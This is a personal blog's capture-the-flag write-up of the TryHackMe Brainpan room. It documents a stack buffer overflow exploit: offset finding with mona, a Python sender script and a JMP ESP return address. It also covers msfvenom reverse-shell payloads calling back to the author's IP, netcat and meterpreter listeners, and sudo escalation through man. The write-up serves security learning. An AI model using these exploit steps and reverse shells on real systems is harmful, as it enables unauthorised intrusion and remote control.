<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Brainpan Write-up | TryHackMe | Utkarsh M</title>
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
    <header class="site-title-main">
      Utkarsh M
    </header>
    <nav>
    <ul class="menu">
      
      <li><a href="/">Home</a></li>
      
      <li><a href="/post/">Posts</a></li>
      
      <li><a href="/categories/">Categories</a></li>
      
      <li><a href="/about/">About</a></li>
      
    </ul>
    <hr/>
    </nav>

<div class="post-container">
  <div class="post-date">2022/06/14</div>
  <h1 class="post-title">Brainpan Write-up | TryHackMe</h1>
</div>

<main>
<h2 id="screenshot"><img src="/assets/img/thm/Brainpan/1.png" alt="screenshot"></h2>
<p>Running a threader3000 scan:</p>
<pre><code class="language-bash">python threader3000.py
10.10.142.220
</code></pre>
<p><img src="/assets/img/thm/Brainpan/2.png" alt="screenshot"></p>
<p>running suggested scan:</p>
<p><img src="/assets/img/thm/Brainpan/3.png" alt="screenshot"></p>
<p>So our program runs at 9999 port, lets checkout the http server running at port 10000.</p>
<p><img src="/assets/img/thm/Brainpan/4.png" alt="screenshot"></p>
<p>Running a dirbuster directory scan on the webserver:</p>
<pre><code class="language-bash">gobuster dir --wordlist=/usr/share/dict/directory-list-2.3-medium.txt --url=http://10.10.142.220:10000/
</code></pre>
<p><img src="/assets/img/thm/Brainpan/5.png" alt="screenshot"></p>
<p>and we have :) brainpan.exe. switching to windows VM and opening it in immunity debugger. :) Lets try interacting with it using netcat.</p>
<p><img src="/assets/img/thm/Brainpan/6.png" alt="screenshot"></p>
<p>finding an offset: :) lets use pattern_create.rb from metasploit tools.</p>
<pre><code>/opt/metasploit-git/tools/exploit/pattern_create.rb -l length
</code></pre>
<p>So starting the length from 100, Trying by multiplying length by 2. we Finally crash at 800.</p>
<p>lets find the offset by using mona.</p>
<p>Lets setup mona configuration first:</p>
<pre><code class="language-shell">!mona config -set workingfolder c:\mona\%p
</code></pre>
<p>finding the offset :)</p>
<pre><code class="language-shell">!mona findmsp -distance 800
</code></pre>
<p><img src="/assets/img/thm/Brainpan/7.png" alt="screenshot"></p>
<p>We can see that the offset is 524. :)</p>
<p>writing a python script to send payloads :)</p>
<pre><code class="language-python">import socket
import struct
TCP_IP = '192.168.122.138'
TCP_PORT = 9999
BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT ))
payload = &quot;&quot;
overflow = &quot;A&quot;*524
retn = &quot;&quot;
padding = &quot;&quot;
msg = overflow + retn + padding + payload
s.recv(BUFFER_SIZE);
s.send(bytes(msg, &quot;latin-1&quot;))
print(s.recv(BUFFER_SIZE));
s.close()
print( &quot;done&quot;)
</code></pre>
<p>:) Now we need to find the bad chars.</p>
<p>generating bytearray using mona:</p>
<pre><code class="language-shell">!mona bytearray -b &quot;\x00&quot;
</code></pre>
<p>generating input byte array using python script:</p>
<pre><code class="language-python">for x in range(1, 256):
print(&quot;\\x&quot; + &quot;{:02x}&quot;.format(x), end='')
print()
</code></pre>
<p>:) using it as the payload, BBBB as the return value and comparing using mona:</p>
<pre><code class="language-shell">!mona compare -f &quot;c:\mona\brainpan\bytearray.bin&quot; -a MSP
</code></pre>
<p><img src="/assets/img/thm/Brainpan/8.png" alt="screenshot"></p>
<p>Unmodified, So we are good to go. :)</p>
<p>Lets find a vulnerable JMP ESP return instruction using mona:</p>
<pre><code class="language-shell">!mona jmp -r esp -cpb &quot;\x00&quot;
</code></pre>
<p><img src="/assets/img/thm/Brainpan/9.png" alt="screenshot"></p>
<p>There’s only a single instruction. :) Lets use its address as the retn value:</p>
<p>Since we have to use little endian format, the retn value will be: <code>\xf3\x12\x17\x31</code></p>
<p>Now Lets create a reverse shell payload, :) directly for meterpreter this time:</p>
<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.47.158 LPORT=4444 -a x86 -b '\x00' -f c
</code></pre>
<p>Meterpreter, Launch Console &amp; Load Handler:</p>
<pre><code class="language-bash">msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.17.47.158; set LPORT 4444; run&quot;
</code></pre>
<p>Lets use a NOP padding of 16 bytes:</p>
<p>trying the payload on local VM machine:</p>
<p><img src="/assets/img/thm/Brainpan/10.png" alt="screenshot"></p>
<p>success: :)</p>
<p>Lets try it on the THM machine.</p>
<p><img src="/assets/img/thm/Brainpan/11.png" alt="screenshot"></p>
<p>success :P</p>
<p>OS info:</p>
<pre><code>meterpreter &gt; sysinfo
Computer        : brainpan
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : brainpan
Logged On Users : 1
Meterpreter     : x86/windows
</code></pre>
<p><em>using meterpreter’s getsystem, We directly gain root privileges.</em></p>
<p><em>Trying manual privilege escalation</em> by using a shell and restarting the server:( I was not able to launch a shell in meterpreter due to the thread impersonation hellllll)</p>
<p>generating new payload:</p>
<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=MY_MACHINE_IP LPORT=4444 EXITFUNC=thread -b &quot;\x00&quot; -f c
</code></pre>
<p>setting up netcat listener</p>
<pre><code class="language-bash">nc -lvnp 4444
</code></pre>
<p><img src="/assets/img/thm/Brainpan/12.png" alt="screenshot"></p>
<p>WEIRD linux directories :o, damn. a lot of the things don’t work. :) at least we have python, which we can’t use and a lot of stuff like whoami doesn’t work either. ;-;</p>
<p>F, Hmm, It’s actually a linux machine running the program using wine. :_; Got to know that, We can try a linux payload directly. + i couldn’t find a way to get out of the cmd shell using wineconsole. :O</p>
<p>so a new msfvenom :_; payload:</p>
<pre><code class="language-bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.17.47.158 LPORT=4444 -b '\x00' EXITFUNC=thread -f c
</code></pre>
<p><img src="/assets/img/thm/Brainpan/13.png" alt="screenshot"></p>
<p>better shell:</p>
<pre><code class="language-shell">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>
<p>Hmm, lets start enumeration :)</p>
<pre><code class="language-shell">sudo -l
</code></pre>
<p>We see an interesting application anansi_util.</p>
<p><img src="/assets/img/thm/Brainpan/14.png" alt="screenshot"></p>
<p>launching the application with sudo :</p>
<p><img src="/assets/img/thm/Brainpan/15.png" alt="screenshot"></p>
<p>so it seems to run shell commands inside. The first one runs ifconfig, while I get an error on the 2nd one about my terminal being unknown while the third gives man pages.</p>
<p>After checking out these applications in GTFObins, we can see that there is a sudo exploit available for man. :) lets exploit.</p>
<p><img src="/assets/img/thm/Brainpan/16.png" alt="screenshot"></p>
<p><img src="/assets/img/thm/Brainpan/17.png" alt="screenshot"></p>
<h2 id="-success">:) Success.</h2>

</main>

  <footer>
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/math-code.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/katex.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/contrib/auto-render.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/render-katex.js" defer></script>

<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/center-img.min.js" defer></script>

  
  <hr/>
  © <a href="https://utkar5hm.github.io">Utkarsh M</a> 2025 &ndash; 2025 | <a href="https://github.com/Utkar5hM">Github</a> | <a href="https://www.linkedin.com/in/utkar5hm/">Linkedin</a>
  
  </footer>
  </body>
</html>

